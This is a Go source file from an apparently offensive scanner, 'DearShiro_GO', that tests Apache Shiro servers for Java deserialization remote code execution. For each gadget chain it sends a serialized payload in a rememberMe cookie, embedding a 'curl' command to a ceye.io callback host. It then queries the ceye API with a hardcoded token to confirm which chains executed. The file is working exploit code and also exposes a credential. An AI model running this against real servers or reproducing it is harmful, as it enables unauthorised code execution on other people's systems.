package scanner

import (
	"DearShiro_GO/core/conn"
	"DearShiro_GO/core/data"
	"encoding/json"
	"fmt"
	"github.com/go-basic/uuid"
	"io/ioutil"
	"os"
	"strconv"
	"time"
)

//type ceyeInfo struct {
//	token      string
//	identifier string
//}

const (
	TOKEN      = "9e74c587b88cd03005d6150e90025a70"
	IDENTIFIER = "d7gt91.ceye.io"
)

type queryResult struct {
	Meta struct {
		Code    int    `json:"code"`
		Message string `json:"message"`
	} `json:"meta"`
	Data []struct {
		ID          string      `json:"id"`
		Name        string      `json:"name"`
		Method      string      `json:"method"`
		RemoteAddr  string      `json:"remote_addr"`
		UserAgent   string      `json:"user_agent"`
		Data        string      `json:"data"`
		ContentType interface{} `json:"content_type"`
		CreatedAt   string      `json:"created_at"`
	} `json:"data"`
}

var AvailableGadget = make([]string, 0, 10)

type GadgetScanner struct {
	TargetUrl      string
	TargetShiroKey string
}

func (this GadgetScanner) Scan() {
	//Attention: command is empty
	payloadMap := data.NewPayloadMap()
	//
	fmt.Fprintln(os.Stderr, "[*]Use Key: "+this.TargetShiroKey)
	for funcName, serialFunc := range payloadMap.NamedFunc {
		randomID := uuid.New()[0:12]
		var command = fmt.Sprintf("curl %s/%s", IDENTIFIER, randomID)
		// Dynamic invoke the serialFunc
		serialData := serialFunc(command)

		shiroConnection := conn.NewConnection(this.TargetUrl)
		fmt.Println("[+] Test Payload: " + funcName)
		response := shiroConnection.SendRememberMe([]byte(this.TargetShiroKey), serialData)
		fmt.Println("[-] Response Code: " + strconv.Itoa(response.StatusCode))

		var queryTemplate = "http://api.ceye.io/v1/records?token=%s&type=http&filter=%s"
		var queryAddress = fmt.Sprintf(queryTemplate, TOKEN, randomID)
		// query the record
		queryConnection := conn.NewConnection(queryAddress)
		time.Sleep(time.Second / 2)
		recordResponse := queryConnection.QueryRecord()
		body, _ := ioutil.ReadAll(recordResponse.Body)
		cq := new(queryResult)
		_ = json.Unmarshal(body, cq)

		if len(cq.Data) != 0 {
			fmt.Fprintln(os.Stderr, "[*] Found gadget: "+funcName)
			AvailableGadget = append(AvailableGadget, funcName)
		}
	}
	PrintAvailableGadget()
}

func PrintAvailableGadget() {
	fmt.Fprintln(os.Stderr, "\n#######Available Gadget######")
	for i, g := range AvailableGadget {
		fmt.Fprintf(os.Stderr, "[%d]: %s", i+1, g)
	}
	fmt.Fprintln(os.Stderr, "\n#######Available Gadget######")
}
